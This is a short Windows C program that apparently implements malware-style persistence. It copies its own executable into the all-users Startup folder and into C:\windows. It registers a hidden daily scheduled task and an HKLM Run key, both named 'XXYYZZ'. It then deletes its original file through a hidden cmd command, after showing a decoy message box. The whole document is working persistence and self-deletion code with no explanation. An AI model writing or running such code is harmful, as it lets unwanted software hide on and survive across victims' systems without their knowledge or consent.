#include <windows.h>
#include <strsafe.h>

#define PATH_LENGTH 323768
int main() {
	HANDLE hHeap = GetProcessHeap();
	LPVOID pathM = HeapAlloc(
		hHeap,
		HEAP_ZERO_MEMORY,
		PATH_LENGTH * 2
	);

	GetModuleFileNameW(
		NULL,
		(PWSTR)pathM,
		PATH_LENGTH * 2
	);
	//1
	BOOL OK5 = CopyFileW((PWSTR)pathM, L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\text.exe", TRUE);
	DWORD n = GetLastError();
	//2
	STARTUPINFOW si = { 0 };
	si.cb = sizeof(STARTUPINFOW);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi;
	WCHAR commandLine[1024] = L"C:\\Windows\\System32\\schtasks.exe /create /tn \"XXYYZZ\" /tr \"";
	StringCchCatW(commandLine, 1024, (PWSTR)pathM);
	StringCchCatW(commandLine, 1024, L"\" /sc daily /st 14:40:00");

	BOOL OK = CreateProcessW(NULL, commandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	MessageBoxW(0, L"halo", L"notice", 0);
	//ExitProcess(0);
	//3
	LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	RegOpenKeyExW(
		HKEY_LOCAL_MACHINE,
		runKeyPath,
		0,
		KEY_SET_VALUE,
		&hKey
	);
	RegSetValueExW(
		hKey,
		L"XXYYZZ",
		0,
		REG_SZ,
		(BYTE*)pathM,
		(lstrlenW((PWSTR)pathM) + 1) * sizeof(WCHAR)
	);




	if (lstrcmpiW(L"C:\\windows\\text.exe", (PWSTR)pathM)) {
		CopyFileW((PWSTR)pathM, L"C:\\windows\\text.exe", TRUE);
		WCHAR cmdArg[256] = L"/c choice /t 2 /d y > nul & del \"";
		StringCchCatW(cmdArg, 256, (PWSTR)pathM);
		StringCchCatW(cmdArg, 256, L"\"");
		DWORD errorCode3 = GetLastError();
		SHELLEXECUTEINFOW execInfo;
		execInfo.cbSize = sizeof(SHELLEXECUTEINFOW);
		execInfo.fMask = 0;
		execInfo.hwnd = NULL;
		execInfo.lpVerb = L"open";
		execInfo.lpFile = L"cmd.exe";
		execInfo.lpParameters = cmdArg;
		execInfo.lpDirectory = NULL;
		execInfo.nShow = SW_HIDE;
		execInfo.hInstApp = NULL;
		BOOL OK = ShellExecuteExW(&execInfo);
		ExitProcess(0);
	}
	ExitProcess(0);
}